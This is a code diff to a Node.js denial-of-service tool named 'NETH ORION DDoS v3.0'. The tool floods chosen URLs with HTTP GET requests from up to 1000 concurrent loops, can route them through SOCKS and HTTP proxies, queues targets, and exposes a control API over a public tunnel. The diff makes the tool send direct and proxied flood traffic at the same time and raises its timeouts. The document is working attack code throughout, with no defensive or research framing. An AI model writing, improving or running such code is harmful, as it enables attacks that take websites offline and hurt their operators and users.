@@ -14,10 +14,10 @@ const app = express();
 app.use(express.json());
 
 const stateFilePath = path.join(__dirname, "attackState.json");
-const REQUESTS_PER_THREAD = parseInt(process.env.PER_THREAD, 10) || 10;
+const REQUESTS_PER_THREAD = parseInt(process.env.PER_THREAD, 10) || 3;
 const numThreads = parseInt(process.env.MAX_THREADS, 10) || 1000;
 const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 3;
-const CONNECTION_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 5000;
+const CONNECTION_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 15000;
 let totalRequestsSent = 0;
 let nportUrl = null;
 let tunnelActive = false;
@@ -112,7 +112,6 @@ function loadProxies() {
 
 const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
 
-// Debounced state file writer – never blocks the event loop
 let saveTimer = null;
 function debouncedSave() {
   if (saveTimer) return;
@@ -139,7 +138,6 @@ function resetTotal() {
   console.log(colors.green("Total reset to 0"));
 }
 
-// SOCKS fallback request (kept for compatibility, avoids axios)
 function socksRequest(url, agent) {
   return new Promise((resolve) => {
     const req = https.request(
@@ -175,7 +173,7 @@ function createContext(proxyLine) {
   return { type: "http", dispatcher: new ProxyAgent(`http://${proxyLine}`) };
 }
 
-const performAttack = async (target, ctx, threadId) => {
+const performAttack = async (target, ctx, threadId, isDirect) => {
   if (!continueAttack || !target) return;
 
   const endTime = target.startTime + target.duration;
@@ -210,10 +208,24 @@ const performAttack = async (target, ctx, threadId) => {
 
     if (ctx.type === "socks") {
       promises.push(socksRequest(url, ctx.agent));
+    } else if (ctx.type === "http") {
+      promises.push(
+        urequest(url, {
+          dispatcher: ctx.dispatcher,
+          method: "GET",
+          headers,
+          signal: AbortSignal.timeout(CONNECTION_TIMEOUT),
+        })
+          .then(async (res) => {
+            await res.body.dump();
+            return { status: res.statusCode };
+          })
+          .catch(() => null)
+      );
     } else {
       promises.push(
         urequest(url, {
-          dispatcher: ctx.type === "direct" ? undefined : ctx.dispatcher,
+          dispatcher: undefined,
           method: "GET",
           headers,
           signal: AbortSignal.timeout(CONNECTION_TIMEOUT),
@@ -234,10 +246,10 @@ const performAttack = async (target, ctx, threadId) => {
       if (r.status === "fulfilled" && r.value && r.value.status) {
         successfulRequests++;
         const s = r.value.status;
-        if (s === 403) console.log(colors.yellow(`[T${threadId}] 403 Forbidden on ${target.url}`));
-        else if (s === 404) console.log(colors.gray(`[T${threadId}] 404 on ${target.url}`));
-        else if (s === 503) console.log(colors.magenta(`[T${threadId}] 503 Overloaded on ${target.url}`));
-        else if (s === 502 || s === 429) console.log(colors.yellow(`[T${threadId}] ${s} on ${target.url}`));
+        if (s === 403) console.log(colors.yellow(`[T${threadId}${isDirect ? "D" : "P"}] 403 Forbidden on ${target.url}`));
+        else if (s === 404) console.log(colors.gray(`[T${threadId}${isDirect ? "D" : "P"}] 404 on ${target.url}`));
+        else if (s === 503) console.log(colors.magenta(`[T${threadId}${isDirect ? "D" : "P"}] 503 Overloaded on ${target.url}`));
+        else if (s === 502 || s === 429) console.log(colors.yellow(`[T${threadId}${isDirect ? "D" : "P"}] ${s} on ${target.url}`));
       }
     }
   } catch {}
@@ -255,7 +267,7 @@ const performAttack = async (target, ctx, threadId) => {
   }
 
   if (continueAttack) {
-    setTimeout(() => performAttack(target, ctx, threadId), 0);
+    setTimeout(() => performAttack(target, ctx, threadId, isDirect), 0);
   }
 };
 
@@ -268,25 +280,36 @@ const resumeAttack = async () => {
   const proxies = loadProxies();
   activeThreads = [];
 
+  let threadId = 0;
+  
   if (!proxies.length) {
-    console.log(colors.yellow("No proxies found — using direct connections"));
-    const ctx = { type: "direct" };
     for (let i = 0; i < numThreads; i++) {
       if (!continueAttack) break;
-      performAttack(currentTarget, ctx, i);
+      const ctx = { type: "direct" };
+      performAttack(currentTarget, ctx, threadId++, true);
       activeThreads.push(i);
     }
-    console.log(colors.green(`Resumed with ${activeThreads.length} threads (direct)`));
+    console.log(colors.green(`Resumed with ${activeThreads.length} threads (direct only)`));
     return;
   }
 
-  for (let i = 0; i < numThreads; i++) {
+  const halfThreads = Math.floor(numThreads / 2);
+  
+  for (let i = 0; i < halfThreads; i++) {
     if (!continueAttack) break;
-    const ctx = createContext(getRandomElement(proxies));
-    performAttack(currentTarget, ctx, i);
+    const ctx = { type: "direct" };
+    performAttack(currentTarget, ctx, threadId++, true);
     activeThreads.push(i);
   }
-  console.log(colors.green(`Resumed with ${activeThreads.length} threads (proxied)`));
+  
+  for (let i = 0; i < numThreads - halfThreads; i++) {
+    if (!continueAttack) break;
+    const ctx = createContext(getRandomElement(proxies));
+    performAttack(currentTarget, ctx, threadId++, false);
+    activeThreads.push(i + halfThreads);
+  }
+  
+  console.log(colors.green(`Resumed with ${activeThreads.length} threads (${halfThreads} direct + ${numThreads - halfThreads} proxy)`));
 };
 
 const autoStartTunnel = async () => {
@@ -344,27 +367,39 @@ const startAttack = async (url, durationHours) => {
   state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
   saveNow();
 
-  const mode = proxies.length ? "proxied" : "direct";
+  const directCount = proxies.length ? Math.floor(numThreads / 2) : numThreads;
+  const proxyCount = proxies.length ? numThreads - directCount : 0;
+  
   console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
-  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD} | Mode: ${mode}`));
+  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD}`));
+  console.log(colors.magenta(`Direct: ${directCount} threads | Proxy: ${proxyCount} threads`));
   console.log(colors.magenta(`Queue size: ${MAX_QUEUE}`));
   if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
   console.log("");
 
   activeThreads = [];
+  let threadId = 0;
+  
   if (!proxies.length) {
-    const ctx = { type: "direct" };
     for (let i = 0; i < numThreads; i++) {
       if (!continueAttack) break;
-      performAttack(currentTarget, ctx, i);
+      const ctx = { type: "direct" };
+      performAttack(currentTarget, ctx, threadId++, true);
       activeThreads.push(i);
     }
   } else {
-    for (let i = 0; i < numThreads; i++) {
+    for (let i = 0; i < directCount; i++) {
+      if (!continueAttack) break;
+      const ctx = { type: "direct" };
+      performAttack(currentTarget, ctx, threadId++, true);
+      activeThreads.push(i);
+    }
+    
+    for (let i = 0; i < proxyCount; i++) {
       if (!continueAttack) break;
       const ctx = createContext(getRandomElement(proxies));
-      performAttack(currentTarget, ctx, i);
-      activeThreads.push(i);
+      performAttack(currentTarget, ctx, threadId++, false);
+      activeThreads.push(i + directCount);
     }
   }
   return true;
@@ -411,7 +446,7 @@ const showStatus = () => {
 
 const showHelp = () => {
   console.log(colors.cyan("\n=== NETH ORION DDoS COMMANDS ==="));
-  console.log(`${colors.green("start <url> [hours]")}        - Start attack`);
+  console.log(`${colors.green("start <url> [hours]")}        - Start attack (direct + proxy simultaneous)`);
   console.log(`${colors.green("add <url> [hours]")}          - Add to queue (max: ${MAX_QUEUE})`);
   console.log(`${colors.green("stop")}                       - Stop attack`);
   console.log(`${colors.green("status")}                     - Show status`);
@@ -419,7 +454,7 @@ const showHelp = () => {
   console.log(`${colors.green("clear")}                      - Clear console`);
   console.log(`${colors.green("help")}                       - This help`);
   console.log(`${colors.green("exit")}                       - Exit\n`);
-  console.log(colors.gray(`Queue size: ${MAX_QUEUE} | Threads: ${numThreads} | Timeout: ${CONNECTION_TIMEOUT}ms`));
+  console.log(colors.gray(`Queue size: ${MAX_QUEUE} | Threads: ${numThreads} | Timeout: ${CONNECTION_TIMEOUT}ms | Mode: DIRECT + PROXY`));
 };
 
 const showQueue = () => {
@@ -438,7 +473,7 @@ const showQueue = () => {
 const clearConsole = () => {
   console.clear();
   console.log(colors.green("NETH ORION DDoS v3.0"));
-  console.log(colors.gray(`Queue System | Max: ${MAX_QUEUE} | Threads: ${numThreads}`));
+  console.log(colors.gray(`Queue System | Max: ${MAX_QUEUE} | Threads: ${numThreads} | Mode: DIRECT+PROXY`));
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
@@ -537,7 +572,7 @@ const port = process.env.PORT || 25694;
     console.clear();
     console.log(colors.green(`\nNETH ORION DDoS v3.0`));
     console.log(colors.cyan(`Local API: http://localhost:${port}`));
-    console.log(colors.magenta(`Queue Size: ${MAX_QUEUE} | Threads: ${numThreads}`));
+    console.log(colors.magenta(`Queue Size: ${MAX_QUEUE} | Threads: ${numThreads} | Mode: DIRECT+PROXY SIMULTANEOUS`));
     if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
     console.log(colors.green('\nType "help" for commands\n'));
 
